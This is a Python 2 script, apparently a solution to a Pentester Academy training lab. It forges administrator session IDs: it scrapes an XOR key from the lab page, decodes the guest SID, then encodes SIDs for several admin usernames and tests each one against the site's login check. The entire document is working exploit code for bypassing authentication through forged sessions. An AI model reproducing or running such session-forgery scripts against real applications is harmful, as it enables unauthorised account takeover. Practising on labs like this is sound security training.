#!/usr/bin/python

import requests
import base64
from itertools import izip, cycle
from termcolor import colored

url_base = "http://pentesteracademylab.appspot.com/lab/webapp/sid/1"
print colored("[*]Request The URL and Search Get The Encryption Key ... ","yellow")

Guest_SID = "Bg8WF0U="

Get_Key = requests.get(url_base)
Key = Get_Key.text.split("\n")[3].split("=")[1].split(")")[0].replace("'","")

print colored("[*]Never Underestimate a Developer ... Key Found %s :)" %Key,"green")
User_SID = base64.decodestring(Guest_SID)
xor = ''.join(chr(ord(x) ^ ord(y)) for (x,y) in izip(User_SID, cycle(Key)))

print colored("[*]Confirm SID for %s" %xor,"green")

Admins = ["administrator", "vivek", "jack"]

for UserName in Admins:
	xor = ''.join(chr(ord(x) ^ ord(y)) for (x,y) in izip(UserName, cycle(Key)))
	Admins_SID = base64.encodestring(xor).strip()
	Admin_Login = requests.get(url_base+"?sid=%s" %Admins_SID)
	if Admin_Login.text.find("Guest") == -1:
		print colored("[*]%s Login As Administrator  with SID = %s ... Well Done!" %(UserName,Admins_SID),"green")
	else:
		print colored("[*]%s Not Administrator ... "%UserName,"red")
